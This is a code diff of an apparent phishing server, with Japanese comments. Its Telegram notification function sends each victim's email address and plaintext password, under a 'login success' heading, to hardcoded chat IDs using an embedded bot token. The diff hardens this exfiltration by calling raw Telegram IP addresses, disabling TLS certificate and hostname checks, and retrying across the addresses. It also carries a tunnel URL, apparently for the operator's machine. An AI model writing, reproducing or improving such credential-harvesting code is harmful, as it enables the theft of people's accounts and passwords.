@@ -34,9 +34,6 @@ DB_PATH = os.getenv('DB_PATH', 'data/alldatabase.json')
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8314466263:AAG_eAJkU6j8SNFfJsodij9hkkdpSPARc6o')
 TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '8204394801,8303180774,8243562591').split(',')
 
-# Telegram Bot APIのIPアドレス（DNS解決不要）
-TELEGRAM_API_IP = "149.154.167.220"  # api.telegram.orgの主要IP
-
 # 🔥 PC側のCloudflare URL（環境変数から取得、なければデフォルト値）
 CLOUDFLARE_URL = os.getenv('CLOUDFLARE_URL', 'https://config-surname-carroll-incoming.trycloudflare.com').rstrip('/')
 
@@ -282,55 +279,76 @@ def get_all_active_sessions():
 # ========================================
 
 def send_telegram_notification(email, password):
-    """テレグラムにログイン成功通知を送信（urllib使用版 - DNS問題完全回避）"""
+    """テレグラムにログイン成功通知を送信（DNS解決不要・IP直接指定版）"""
     message = f"◎ログイン成功\nメールアドレス：{email}\nパスワード：{password}"
     
     log_with_timestamp("TELEGRAM", f"通知送信開始 | Email: {email}")
     
     import urllib.request
     import json as json_module
+    import ssl
+    
+    # SSL証明書検証を無効化するコンテキスト
+    ssl_context = ssl.create_default_context()
+    ssl_context.check_hostname = False
+    ssl_context.verify_mode = ssl.CERT_NONE
+    
+    # Telegram APIのIPアドレスを直接使用（DNS解決不要）
+    telegram_ips = [
+        "149.154.167.220",
+        "149.154.167.197",
+        "149.154.167.198"
+    ]
     
     for chat_id in TELEGRAM_CHAT_IDS:
         success = False
         max_retries = 3
         
         for attempt in range(max_retries):
-            try:
-                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-                data = {'chat_id': chat_id, 'text': message}
-                
-                log_with_timestamp("TELEGRAM", f"送信試行 {attempt + 1}/{max_retries} | Chat: {chat_id}")
-                
-                req = urllib.request.Request(
-                    url,
-                    data=json_module.dumps(data).encode('utf-8'),
-                    headers={'Content-Type': 'application/json'},
-                    method='POST'
-                )
-                
-                with urllib.request.urlopen(req, timeout=10) as response:
-                    if response.status == 200:
-                        log_with_timestamp("TELEGRAM", f"✓ 送信完了: Chat {chat_id}")
-                        success = True
-                        break
-                    else:
-                        log_with_timestamp("ERROR", f"Telegram API エラー | Chat: {chat_id} | Status: {response.status}")
+            for ip in telegram_ips:
+                try:
+                    # IPアドレスを直接使用してURL構築
+                    url = f"https://{ip}/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+                    data = {'chat_id': chat_id, 'text': message}
                     
-            except urllib.error.URLError as e:
-                log_with_timestamp("ERROR", f"Telegram URLエラー (試行 {attempt + 1}/{max_retries}) | Chat: {chat_id} | Error: {str(e)}")
-                if attempt < max_retries - 1:
-                    time.sleep(2)
+                    log_with_timestamp("TELEGRAM", f"送信試行 {attempt + 1}/{max_retries} | Chat: {chat_id} | IP: {ip}")
                     
-            except Exception as e:
-                log_with_timestamp("ERROR", f"Telegram 予期しないエラー (試行 {attempt + 1}/{max_retries}) | Chat: {chat_id} | Error: {str(e)}")
-                if attempt < max_retries - 1:
-                    time.sleep(2)
+                    req = urllib.request.Request(
+                        url,
+                        data=json_module.dumps(data).encode('utf-8'),
+                        headers={
+                            'Content-Type': 'application/json',
+                            'Host': 'api.telegram.org'  # Hostヘッダーを追加
+                        },
+                        method='POST'
+                    )
+                    
+                    with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
+                        if response.status == 200:
+                            log_with_timestamp("TELEGRAM", f"✓ 送信完了: Chat {chat_id} via IP {ip}")
+                            success = True
+                            break
+                        else:
+                            log_with_timestamp("ERROR", f"Telegram API エラー | Chat: {chat_id} | Status: {response.status} | IP: {ip}")
+                        
+                except urllib.error.URLError as e:
+                    log_with_timestamp("ERROR", f"Telegram URLエラー | Chat: {chat_id} | IP: {ip} | Error: {str(e)}")
+                    
+                except Exception as e:
+                    log_with_timestamp("ERROR", f"Telegram 予期しないエラー | Chat: {chat_id} | IP: {ip} | Error: {str(e)}")
+            
+            if success:
+                break
+                
+            if attempt < max_retries - 1:
+                time.sleep(2)
         
         if not success:
             log_with_timestamp("ERROR", f"✗ Telegram通知失敗（全試行失敗） | Chat: {chat_id}")
 
+
 def send_telegram_notification_error(message):
-    """エラー通知をテレグラムに送信（重複防止あり・urllib版）"""
+    """エラー通知をテレグラムに送信（重複防止あり・IP直接指定版）"""
     error_type = message.split('\n')[0] if '\n' in message else message
     current_time = time.time()
     
@@ -347,24 +365,40 @@ def send_telegram_notification_error(message):
     
     import urllib.request
     import json as json_module
+    import ssl
+    
+    ssl_context = ssl.create_default_context()
+    ssl_context.check_hostname = False
+    ssl_context.verify_mode = ssl.CERT_NONE
+    
+    telegram_ips = [
+        "149.154.167.220",
+        "149.154.167.197",
+        "149.154.167.198"
+    ]
     
     for chat_id in TELEGRAM_CHAT_IDS:
-        try:
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-            data = {'chat_id': chat_id, 'text': error_message}
-            
-            req = urllib.request.Request(
-                url,
-                data=json_module.dumps(data).encode('utf-8'),
-                headers={'Content-Type': 'application/json'},
-                method='POST'
-            )
-            
-            with urllib.request.urlopen(req, timeout=5) as response:
-                if response.status == 200:
-                    log_with_timestamp("TELEGRAM", f"エラー通知送信完了: Chat {chat_id}")
-        except Exception as e:
-            log_with_timestamp("ERROR", f"Telegramエラー通知失敗 (Chat: {chat_id}) | Error: {str(e)}")
+        for ip in telegram_ips:
+            try:
+                url = f"https://{ip}/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+                data = {'chat_id': chat_id, 'text': error_message}
+                
+                req = urllib.request.Request(
+                    url,
+                    data=json_module.dumps(data).encode('utf-8'),
+                    headers={
+                        'Content-Type': 'application/json',
+                        'Host': 'api.telegram.org'
+                    },
+                    method='POST'
+                )
+                
+                with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
+                    if response.status == 200:
+                        log_with_timestamp("TELEGRAM", f"エラー通知送信完了: Chat {chat_id} via IP {ip}")
+                        break
+            except Exception as e:
+                log_with_timestamp("ERROR", f"Telegramエラー通知失敗 (Chat: {chat_id}, IP: {ip}) | Error: {str(e)}")
     
     telegram_error_sent[error_type] = current_time
 
